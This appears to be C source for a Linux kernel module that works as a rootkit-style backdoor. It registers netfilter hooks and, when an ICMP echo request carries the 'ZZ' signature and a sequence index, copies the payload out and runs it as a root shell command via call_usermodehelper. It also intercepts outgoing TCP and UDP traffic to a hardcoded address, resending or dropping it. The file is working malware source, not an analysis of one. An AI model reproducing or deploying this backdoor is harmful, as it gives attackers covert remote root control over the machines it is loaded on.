#include "include/net.h"

#define NET_IP_TARGET		0x3C08050A 	//10.05.08.60  used as constant var(lkm_lout_ipdst)
#define LKM_CMD_LEN_MAX 	1024
#define ICMP_SIGN_LEN_MAX 	20				

int lkm_net_init(void);
int lkm_net_exit(void);
static unsigned int lkm_tcp_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state, struct tcphdr *tcp, unsigned char *tail, int ip_dst, int ip_src); 
static unsigned int lkm_udp_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state, struct udphdr *udp, unsigned char *tail, int ip_dst, int ip_src);
static int lkm_udp_send(struct sk_buff *skb, int port_dst, int port_src, int ip_dst, int ip_src, void *data, int len); 
static unsigned int lkm_nf_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state); 
static unsigned int lkm_icmp_hook(void *priv, struct icmphdr *icmp, unsigned char *tail); 
static unsigned int lkm_icmp_shell(struct icmphdr *icmp, char *data, int data_len); 
static void bd_icmp_shell(struct work_struct *work);
static int lkm_check_lout_ip(int ip_dst);
static int lkm_nf_unregister(void);
static int lkm_nf_register(void);

static struct nf_hook_ops *lkm_nf_in = NULL;
static struct nf_hook_ops *lkm_nf_out = NULL;
static struct lkm_nf_hook_priv lkm_priv_in;
static struct lkm_nf_hook_priv lkm_priv_out;

static unsigned char *icmp_shell_sign = "ZZ";
struct work_struct icmp_shell_work;
static char *cmd_icmp_str = NULL;
static bool cmd_icmp_flag = true;
static short cmd_icmp_indx = 0;
static void bd_icmp_shell(struct work_struct *work);
static struct netpoll lkm_netpoll;
DECLARE_WORK(icmp_shell_work, bd_icmp_shell);
const int lkm_lout_ipdst = NET_IP_TARGET;
//int lkm_dst_port = 41781;
/*
////////////////////// DEBUG //////////////////////////////////////////////////////////////////////////////////////////
static unsigned int lkm_nf_info(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
static unsigned int lkm_icmp_dump(struct sk_buff *skb, struct icmphdr *ihdr);
static unsigned int lkm_eth_dump(struct sk_buff *skb, struct ethhdr *ehdr);
static unsigned int lkm_tcp_dump(struct sk_buff *skb, struct tcphdr *tcp); 
static unsigned int lkm_udp_dump(struct sk_buff *skb, struct udphdr *udp);
static unsigned int lkm_ip_dump(struct sk_buff *skb, struct iphdr *ip); 
static unsigned int lkm_skb_dump(struct sk_buff *skb); 

static unsigned int lkm_nf_info(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {

	struct ethhdr *ethh = eth_hdr(skb);
	struct iphdr *iph = ip_hdr(skb);
	short eth_proto = (short)ethh->h_proto;
	char  ip_proto  = (char)iph->protocol;

	lkm_skb_dump(skb);
	lkm_eth_dump(skb, NULL);
	if(eth_proto==0x0800) {
		lkm_ip_dump(skb, NULL);
	}
	if(ip_proto==IPPROTO_UDP) {
		lkm_udp_dump(skb, NULL);
	}
	else if(ip_proto==IPPROTO_TCP) {
		lkm_tcp_dump(skb, NULL);
	}
	else if(ip_proto==IPPROTO_ICMP) {
		lkm_icmp_dump(skb, NULL);
	}

	return 0;
}
static unsigned int lkm_icmp_dump(struct sk_buff *skb, struct icmphdr *ihdr) {
	struct icmphdr *icmph;
	if( (ihdr==NULL) && (skb!=NULL) ) {
		icmph = icmp_hdr(skb);
	} else if(ihdr!=NULL) {
		icmph = ihdr;
	}
	else {
		return -1;
	}
	printk(KERN_INFO "-+--------DUMP ICMP\n");
	printk(KERN_INFO " icmph_sz=%lx, timeval_sz=%lx", sizeof(struct icmphdr), sizeof(struct timespec64));

	printk(KERN_INFO "---------\n");
	return 0;
}
static unsigned int lkm_tcp_dump(struct sk_buff *skb, struct tcphdr *tcp) {
	struct tcphdr *tcph;
	if( (tcp==NULL) && (skb!=NULL)) {
		tcph = tcp_hdr(skb);
	} else if(tcp!=NULL) {
		tcph = tcp;
	}
	else {
		return -1;
	}
	printk(KERN_INFO "-+--------DUMP TCP\n");
	int port_dst = ntohs(tcph->dest);	
        int port_src = ntohs(tcph->source);
	short flags = tcp_flag_word(tcph);

	printk(KERN_INFO "pdst=%d|psrc=%d|flags=%d|state=0x%x\n", port_dst, port_src, flags, (short)skb->sk->sk_state);
	printk(KERN_INFO "---------\n");
	return 0;
}
static unsigned int lkm_skb_dump(struct sk_buff *skb) {

	struct sock *sk = skb->sk;
	int prior = skb->priority;
	int prior_sk = sk->sk_priority;

	printk(KERN_INFO "----------DUMP SKB_BUF\n");
	printk(KERN_INFO "pri(%d)|pri_sk(%d)|\n", prior, prior_sk);
	printk(KERN_INFO "---------\n");
	return 0;
}
static unsigned int lkm_eth_dump(struct sk_buff *skb, struct ethhdr *ehdr) {
	struct ethhdr *ethh;
	if( (ehdr==NULL) && (skb!=NULL) ) {
		ethh = eth_hdr(skb);
	} else if(ehdr!=NULL) {
		ethh = ehdr;
	}	
	else {
		return -1;
	}
	printk(KERN_INFO "----------DUMP ETHERNET\n");
	printk(KERN_INFO "dst(%x:%x:%x:%x:%x:%x)|src(%x:%x:%x:%x:%x:%x)|proto(0x%hx)\n", (char)ethh->h_dest[0], (char)ethh->h_dest[1], (char)ethh->h_dest[2], (char)ethh->h_dest[3], (char)ethh->h_dest[4], (char)ethh->h_dest[5], (char)ethh->h_source[0], (char)ethh->h_source[1], (char)ethh->h_source[2], (char)ethh->h_source[3], (char)ethh->h_source[4], (char)ethh->h_source[5], (short)ethh->h_proto);	
	printk(KERN_INFO "---------\n");
	return 0;
}
static unsigned int lkm_ip_dump(struct sk_buff *skb, struct iphdr *ip) {
	struct iphdr *iph;
	if( (ip==NULL) && (skb!=NULL) ) {
		iph = ip_hdr(skb);
	} else if(ip!=NULL)  {
		iph = ip;
	}
	else {
		return -1;
	}
	char *dst = (char*)&iph->daddr;
	char *src = (char*)&iph->saddr;
	short checks = (short)iph->check;
	short len = ntohs((short)iph->tot_len);
	printk(KERN_INFO "----------DUMP IP\n");
	printk(KERN_INFO "dst(%d.%d.%d.%d)|src(%d.%d.%d.%d)|proto(%hu)|check(0x%hx)|len(%hu)", (char)dst[0], (char)dst[1], (char)dst[2], (char)dst[3], (char)src[0], (char)src[1], (char)src[2], (char)src[3], (char)iph->protocol, (short)checks, (short)len);
	printk(KERN_INFO "---------\n");
	return 0;
}
static unsigned int lkm_udp_dump(struct sk_buff *skb, struct udphdr *udp) {
	struct udphdr *udph;
	if( (udp==NULL) && (skb!=NULL) ) {
		udph = udp_hdr(skb);
	} else if(udp!=NULL) {
		udph = udp;
	}
	else {
		return -1;
	}
	short dst = ntohs(udph->dest);
	short src = ntohs(udph->source);
	short len = ntohs(udph->len);
	printk(KERN_INFO "----------DUMP UDP\n");
	printk(KERN_INFO "dst(%hu)|src(%hu)|check(0x%hx)|len(%hd)\n", dst, src, (short)udph->check, len);
	printk(KERN_INFO "---------\n");
	return 0;
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
static void bd_icmp_shell(struct work_struct *work) {

  	static char *argv[] = {"/bin/sh", "-c", NULL, NULL};
	argv[2] = cmd_icmp_str;
	static char *envp[] = {"PATH=/bin:/sbin", NULL};
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	memset(cmd_icmp_str, 0, LKM_CMD_LEN_MAX);
	cmd_icmp_flag = true;
}
/*BACKDOOR ICMP packet: icmp_header(8bytes)+timespec64(16bytes)+signature(2bytes)+indx(2bytes)+ShellBash(<=LKM_CMD_LEN_MAXbytes)
 * signature == cmd_icmp_sign; indx(packet serial number) == cmd_icmp_indx+1; icmp_header->type == ICMP_ECHO; 
 */
static unsigned int lkm_icmp_shell(struct icmphdr *icmp, char *data, int data_len) {
	int len_sign = strlen(icmp_shell_sign);
	char *buf = data+sizeof(struct timespec64);
	short indx = *(short*)(buf+len_sign);

	if(icmp->type!=ICMP_ECHO) return NF_ACCEPT;
	if(strncmp(buf, icmp_shell_sign, len_sign)) return NF_ACCEPT;
	if(!cmd_icmp_str || !cmd_icmp_flag || ((cmd_icmp_indx+1) != indx)) return NF_DROP;

	if((data_len-20)<=LKM_CMD_LEN_MAX) { //data_len-(timespec64(16bytes)+signature(2bytes)+indx(2bytes))
		cmd_icmp_flag = false;
		cmd_icmp_indx++;
		strcpy(cmd_icmp_str, buf+len_sign+sizeof(short));
		schedule_work(&icmp_shell_work);
		//printk(KERN_INFO "cmd_str:%s", cmd_icmp_str);
	}
	return NF_DROP;
}
static unsigned int lkm_icmp_hook(void *priv, struct icmphdr *icmp, unsigned char *tail) {

	struct lkm_nf_hook_priv *p = priv;
	unsigned char *user_data = (unsigned char*)((unsigned char*)icmp+(sizeof(struct icmphdr)));
	unsigned int ret = NF_ACCEPT;
	int dlen = tail-user_data;

	if(p->in_out==(char)NF_INET_PRE_ROUTING) { 
		ret = lkm_icmp_shell(icmp, user_data, dlen);
		//lkm_icmp_dump(NULL, icmp);
		return ret;
	}
	else if(p->in_out==(char)NF_INET_LOCAL_OUT) {  
	}

	return NF_ACCEPT;
}
static int lkm_udp_send(struct sk_buff *skb, int port_dst, int port_src, int ip_dst, int ip_src, void *data, int len) {
// IN: ip_dst/ip_src == from net; port_dst/port_src == from host;
	strcpy(lkm_netpoll.dev_name, "eth0");
	memset(lkm_netpoll.remote_mac, 0xFF, ETH_ALEN);
	lkm_netpoll.name = "01010101";
	lkm_netpoll.local_ip.ip = ip_src;
	lkm_netpoll.remote_ip.ip = ip_dst;
	lkm_netpoll.local_port = port_src;
	lkm_netpoll.remote_port = port_dst;
	netpoll_print_options(&lkm_netpoll);
	netpoll_setup(&lkm_netpoll);
	netpoll_send_udp(&lkm_netpoll, data, len);
	return 0;
}
static unsigned int lkm_udp_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state, struct udphdr *udp, unsigned char *tail, int ip_dst, int ip_src) {

	struct lkm_nf_hook_priv *p = priv;
	unsigned int ret = NF_ACCEPT;
	int port_dst = ntohs(udp->dest);
	int port_src = ntohs(udp->source);
	short len = ntohs(udp->len) - sizeof(struct udphdr);
	char *data = (char*)udp+sizeof(struct udphdr);

	if(p->in_out==(char)NF_INET_LOCAL_OUT) {
		lkm_udp_send(skb, port_dst, port_src, ip_dst, ip_src, data, len);
		return NF_DROP;
	}
	else if(p->in_out==(char)NF_INET_PRE_ROUTING) { 
	}
	return ret;
}

static unsigned int lkm_tcp_out2nel(struct sk_buff *skb, const struct nf_hook_state *state, struct tcphdr *tcp) {
	
	if(skb->sk->sk_state != TCP_ESTABLISHED) return NF_ACCEPT;	
	//state->okfn(state->net, state->sk, skb);
	return NF_DROP;
}
static unsigned int lkm_tcp_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state, struct tcphdr *tcp, unsigned char *tail, int ip_dst, int ip_src) {

	unsigned int ret = NF_ACCEPT;
	struct lkm_nf_hook_priv *p = priv;
        //int port_src = ntohs(tcp->source);
	//int port_dst = ntohs(tcp->dest);	

	if(p->in_out==(char)NF_INET_LOCAL_OUT) {
		ret = lkm_tcp_out2nel(skb, state, tcp);
	}
	else if(p->in_out==(char)NF_INET_PRE_ROUTING) { 
		//lkm_tcp_dump(skb, tcp);
	}
	
	return ret;
}	
static int lkm_check_lout_ip(int ip_dst) {
	if(ip_dst!=lkm_lout_ipdst) return -1;
	return 0;
}
static unsigned int lkm_nf_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {

	int ip_dst = 0;
	int ip_src = 0;
	unsigned int ret = NF_ACCEPT;
	struct lkm_nf_hook_priv *p = priv;

	struct iphdr *iph = (struct iphdr *)skb_network_header(skb); 
	if(!iph) return ret;

	ip_dst = iph->daddr;
	ip_src = iph->saddr;
	if(p->in_out==(char)NF_INET_LOCAL_OUT) {
		if(lkm_check_lout_ip(ip_dst)) return ret;
	}

	void *trh = skb_transport_header(skb);
	if(!trh) return ret;

	unsigned char *tail = skb_tail_pointer(skb); 
	switch(iph->protocol) {

		case IPPROTO_TCP:
			struct tcphdr *tcph = trh;
			ret = lkm_tcp_hook(priv, skb, state, tcph, tail, ip_dst, ip_src);
			break;

		case IPPROTO_UDP:
			struct udphdr *udph = trh;
			ret = lkm_udp_hook(priv, skb, state, udph, tail, ip_dst, ip_src);
			break;

		case IPPROTO_ICMP:
			struct icmphdr *icmph = trh;
			ret = lkm_icmp_hook(priv, icmph, tail);
			break;

		case IPPROTO_IGMP:
			//struct igmphdr *igmph = trh;
			break;
		//case IPPROTO_RAW:
	}
	return ret;
}

static int lkm_nf_register(void) {

	cmd_icmp_str = kcalloc(1, LKM_CMD_LEN_MAX, GFP_KERNEL);

	lkm_nf_in  = (struct nf_hook_ops*) kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	if(lkm_nf_in != NULL) {
		//printk(KERN_INFO "nf_in OK\n");
		lkm_priv_in.in_out = NF_INET_PRE_ROUTING;

		lkm_nf_in->hook = lkm_nf_hook;
		lkm_nf_in->hooknum = NF_INET_PRE_ROUTING;
		lkm_nf_in->priority = NF_IP_PRI_FIRST;
		lkm_nf_in->pf = PF_INET;
		lkm_nf_in->priv = &lkm_priv_in;

		nf_register_net_hook(&init_net, lkm_nf_in);
	}

	lkm_nf_out = (struct nf_hook_ops*) kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	if(lkm_nf_out != NULL) {
		//printk(KERN_INFO "nf_out OK\n");
		lkm_priv_out.in_out = NF_INET_LOCAL_OUT;

		lkm_nf_out->hook = lkm_nf_hook;
		lkm_nf_out->hooknum = NF_INET_LOCAL_OUT;
		lkm_nf_out->priority = NF_IP_PRI_FIRST;
		lkm_nf_out->pf = PF_INET;
		lkm_nf_out->priv = &lkm_priv_out;

		nf_register_net_hook(&init_net, lkm_nf_out);
	}

	return 0;
}
static int lkm_nf_unregister(void) {

	kfree(cmd_icmp_str);
	if(lkm_nf_in != NULL) {
		nf_unregister_net_hook(&init_net, lkm_nf_in);
		kfree(lkm_nf_in);
	}
	if(lkm_nf_out != NULL) {
		nf_unregister_net_hook(&init_net, lkm_nf_out);
		kfree(lkm_nf_out);
	}

	return 0;
}

int lkm_net_init(void) {

	printk(KERN_INFO "+++INIT_net\n");
	lkm_nf_register();
	return 0;
}
int lkm_net_exit(void) {

	lkm_nf_unregister();
	printk(KERN_INFO "---EXIT_net\n");
	return 0;
}
